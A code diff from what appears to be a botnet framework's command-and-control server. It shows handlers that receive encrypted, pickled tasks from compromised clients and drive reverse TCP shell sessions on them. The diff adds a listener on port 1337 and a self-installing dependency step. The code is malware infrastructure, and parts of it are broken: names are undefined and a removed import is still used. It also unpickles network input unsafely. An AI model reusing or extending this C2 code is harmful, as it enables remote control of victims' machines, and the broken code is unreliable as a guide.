@@ -29,19 +29,71 @@ import json
 import time
 import struct
 import socket
+import select
 import threading
+import subprocess
 import collections
-from SimpleHTTPServer import SimpleHTTPRequestHandler as RequestHandler
-
-# packages
-import socketserver
+import SimpleHTTPServer
 
 # modules
 import util
-import security
+
+# packages
+packages = ['SocketServer']
+missing  = []
+for __package in packages:
+    try:
+        exec("import {}".format(__package), globals())
+    except ImportError:
+        missing.append(__package)
+
+# fix missing dependencies
+if missing:
+    proc = subprocess.Popen('{} -m pip install {}'.format(sys.executable, ' '.join(missing)), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
+    proc.wait()
+    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
+
+# main
+class Server(SocketServer.ThreadingTCPServer):
+
+    """ 
+    Base server which can be combined with handlers from byob.core.handlers
+    to create different types of server instances
+    
+    """
+
+    allow_reuse_address = True
+
+    def __init__(self, host='0.0.0.0', port=1337, handler=SimpleHTTPServer.SimpleHTTPRequestHandler):
+        """
+
+        `Optional`
+        :param str host:        server hostname or IP address
+        :param int port:        server port number
+
+        Returns a byob.server.Server instance
+        
+        """
+        SocketServer.ThreadingTCPServer.__init__(self, (host, port), handler)
+
+    @util.threaded
+    def serve_until_stopped(self):
+        """
+        Run server while byob.server.Server.abort is False;
+        abort execution if True
+        
+        """
+        abort = False
+        while True:
+            rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)
+            if rd:
+                self.handle_request()
+            abort = globals().get('__abort')
+            if abort:
+                break
 
 
-class TaskHandler(socketserver.StreamRequestHandler):
+class TaskHandler(SocketServer.StreamRequestHandler):
     """ 
     Task handler for the C2 server that handles
     incoming tasks from clients operating in 
@@ -63,128 +115,11 @@ class TaskHandler(socketserver.StreamRequestHandler):
                 msg += self.connection.recv(msg_size - len(msg))
             session = self.server._get_client_by_connection(self.connection)
             task    = pickle.loads(security.decrypt_aes(msg, session.key))
-            if isinstance(task, dict):
+            if isinstance(task, logging.LogRecord):
+                self.server.database.handle_task(task.__dict__)
+            elif isinstance(task, dict):
                 self.server.database.handle_task(task)
+            else:
+                util.debug("invalid task format - expected {}, received {}".format(dict, type(task)))
 
 
-class SessionHandler(socketserver.StreamRequestHandler):
-    """ 
-    Session handler for TCP Server that handles
-    incoming connections from new sessions
-    
-    """
-
-    def _kill(self):
-        self._active.clear()
-        self.server.session_remove(self.id)
-        self.server.current_session = None
-        self.server._active.set()
-        self.server.run()
-
-    def client_info(self):
-        """
-        Get information about the client host machine
-        to identify the session
-        
-        """
-        header_size = struct.calcsize("L")
-        header      = self.connection.recv(header_size)
-        msg_size    = struct.unpack(">L", header)[0]
-        msg         = self.connection.recv(msg_size)
-        while len(msg) < msg_size:
-             msg += self.connection.recv(msg_size - len(msg))
-        info = security.decrypt_aes(msg, self.key)
-        info = json.loads(data)
-        info2 = self.server.database.handle_session(info)
-        if isinstance(info2, dict):
-            info = info2
-        self.server.send_task(json.dumps(info))
-        return info
-
-    def status(self):
-        """ 
-        Check the status and duration of the session
-        
-        """
-        c = time.time() - float(self._created)
-        data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
-              '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
-              '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
-              '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
-        return ', '.join([i for i in data if i])
-
-    def send_task(self, command):
-        """ 
-        Send command to a client as a standard task
-
-        `Required`
-        :param str command:         shell/module command
-
-        """
-        raw_data    = security.encrypt_aes(json.dumps(task), session.key)
-        packed_data = (struct.pack("!L", len(raw_data)) + raw_data)
-        self.connection.sendall(packed_data)
-
-
-    def recv_task(self):
-        """ 
-        Listen for incoming task results from a client
-
-        """
-        header_size = struct.calcsize("!L")
-        header      = self.connection.recv(header_size)
-        msg_size    = struct.unpack("!L", header)[0]
-        msg         = self.connection.recv(msg_size)
-        data        = security.decrypt_aes(msg, self.key)
-        return json.loads(data)
-
-    def handle(self):
-        """ 
-        Handle an incoming connection that is sending a
-        reverse TCP shell back to the server
-
-        """
-        self._prompt    = None
-        self._active    = threading.Event()
-        self._created   = time.time()
-        self.id         = id
-        self.key        = security.diffiehellman(self.connection)
-        self.info       = self.session_info()
-        while True:
-            try:
-                if self._active.wait():
-                    task = self.server.recv_task() if not self._prompt else self._prompt
-                    if 'help' in task.get('task'):
-                        self._active.clear()
-                        self.server.help(task.get('result'))
-                        self._active.set()
-                    elif 'prompt' in task.get('task'):                        
-                        self._prompt = task
-                        command = self._get_prompt(task.get('result') % int(self.id))
-                        cmd, _, action  = command.partition(' ')
-                        if cmd in ('\n', ' ', ''):
-                            continue
-                        elif cmd in self.server.commands and cmd != 'help':                            
-                            result = self.server.commands[cmd](action) if len(action) else self.server.commands[cmd]()
-                            if result:
-                                task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
-                                self.server.display(result)
-                                self.server.database.handle_task(task)
-                            continue
-                        else:
-                            task = self.server.database.handle_task({'task': command, 'session': self.info.get('uid')})
-                            self.server.send_task(task)
-                    elif 'result' in task:
-                        if task.get('result') and task.get('result') != 'None':
-                            self.server.display(task.get('result'))
-                            self.server.database.handle_task(task)
-                    else:
-                        if self._abort:
-                            break
-                    self._prompt = None
-            except Exception as e:
-                self._error(str(e))
-                time.sleep(1)
-                break
-        self._active.clear()
-        self.server._return()
